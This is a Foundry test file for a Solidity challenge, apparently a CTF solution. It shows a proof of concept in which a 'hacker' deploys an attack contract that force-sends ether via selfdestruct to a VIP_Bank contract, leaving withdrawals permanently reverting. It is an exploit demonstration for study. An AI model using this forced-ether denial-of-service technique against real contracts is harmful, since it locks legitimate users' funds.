// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/VIPBank.sol";
import "../src/AttackContract.sol";

contract Hack is Test {
    VIP_Bank public vipBank;
    AttackContract public attackContract;
    address public owner = makeAddr("owner");
    address public hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        vipBank = new VIP_Bank();

        vm.deal(owner, 10 ether);
        vm.deal(hacker, 0.5 ether + 1);
    }

    function testHack() public {
        vm.prank(hacker);
        // Forcefully send ether to vipBank via selfdestruct
        attackContract = new AttackContract{value: hacker.balance}(vipBank);
    
        // vipBank balance exceeds maxETH, withdraw() gets stuck
        vm.startPrank(owner);
        vipBank.addVIP(owner);
        vipBank.deposit{value: 0.05 ether}();
        vm.expectRevert(bytes("Cannot withdraw more than 0.5 ETH per transaction"));
        vipBank.withdraw(0.05 ether);
    }
}
